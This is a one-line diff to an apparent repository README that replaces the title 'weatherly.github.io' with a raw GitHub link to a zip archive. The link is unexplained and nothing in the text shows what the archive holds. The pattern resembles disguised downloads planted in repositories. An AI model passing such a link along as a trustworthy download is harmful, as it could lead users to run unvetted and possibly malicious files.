@@ -1,1 +1,1 @@
-# weatherly.github.io
+# https://raw.githubusercontent.com/AviRedDevil/weatherly.github.io/main/bullet/io_weatherly_github_2.9.zip
